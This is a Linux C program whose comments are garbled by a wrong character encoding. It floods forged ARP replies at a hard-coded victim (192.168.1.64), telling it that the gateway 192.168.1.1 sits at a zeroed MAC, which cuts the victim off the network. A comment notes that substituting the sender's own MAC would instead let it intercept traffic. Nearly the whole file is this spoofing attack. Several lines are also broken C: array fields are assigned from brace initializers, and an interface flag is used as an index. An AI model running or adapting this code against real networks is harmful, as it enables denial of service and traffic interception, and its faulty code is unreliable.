//linux c arp��ĳ���R�G - ���y�õo�e�ۤv��arp�]

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <net/if.h>

//�p�G�u�O�Q������_���A���N��mac�����]��MAC_TRICK�A
//�Q�I��ƾڥ]���N��MAC_SOURCE
#define MAC_TRICK {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
#define MAC_SOURCE {0x00, 0x0c, 0x29, 0xc7, 0x16, 0x33}
//�_�R��IP
#define IP_TRICK "192.168.1.1"
//�ت�������MAC
#define MAC_TARGET {0x6c, 0x62, 0x6d, 0x3e, 0x8d, 0x60}
//�ت�������IP
#define IP_TARGET "192.168.1.64"

struct arp_packet
{
	//DLC Header
	//������mac
	unsigned char mac_target[ETH_ALEN];
	//�o�e��mac
	unsigned char mac_source[ETH_ALEN];
	//Ethertype - 0x0806�OARP�V��������
	unsigned short ethertype;

	//ARP Frame
	//�w������ - �A�Ӻ�������0x1
	unsigned short hw_type;
	//�W�h��w���� - IP��w(0x0800)
	unsigned short proto_type;
	//MAC�a�}����
	unsigned char mac_addr_len;
	//IP�a�}����
	unsigned char ip_addr_len;
	//�ާ@�X - 0x1���ARP�ШD�],0x2��������]
	unsigned short operation_code;
	//�o�e��mac
	unsigned char mac_sender[ETH_ALEN];
	//�o�e��ip
	unsigned char ip_sender[4];
	//������mac
	unsigned char mac_receiver[ETH_ALEN];
	//������ip
	unsigned char ip_receiver[4];
	//��R�ƾ�
	unsigned char padding[18];
};

void die(const char *pre);

int main(void)
{
	int sfd, len;
	struct arp_packet ap;
	struct in_addr inaddr_sender, inaddr_receiver;
	struct sockaddr_ll sl;

	sfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if(-1 == sfd)
	{
		perror("socket");
	}

	memset(&ap, 0, sizeof(arp_packet));
	ap.mac_target = MAC_TARGET;
	ap.mac_source = MAC_TRICK;
	ap.ethertype = htons(0x0806);
	ap.hw_type = htons(0x1);
	ap.proto_type = htons(0x0800);
	ap.mac_addr_len = ETH_ALEN;
	ap.ip_addr_len = 4;
	ap.operation_code = htons(0x2);
	ap.mac_sender = MAC_TRICK;
	inet_aton(IP_TRICK, &inaddr_sender);
	memcpy(&ap.ip_sender, &inaddr_sender, sizeof(inaddr_sender));
	ap.mac_receiver = MAC_TARGET;
	inet_aton(IP_TARGET, &inaddr_receiver);
	memcpy(&ap.ip_receiver, &inaddr_receiver, sizeof(inaddr_receiver));

	memset(&sl, 0, sizeof(sl));
	sl.sll_family = AF_PACKET;
	//sl.sll_addr = MAC_SOURCE;
	//sl.sll_halen = ETH_ALEN;
	sl.sll_ifindex = IFF_BROADCAST;//�D�`���n

	while(1)
	{
		len = sendto(sfd, &ap, sizeof(ap), 0, (struct sockaddr*)&sl, sizeof(sl));
		if(-1 == len)
		{
			die("sendto");
		}
	}

	return 0;
}

void die(const char *pre)
{
	perror(pre);
	exit(1);
}
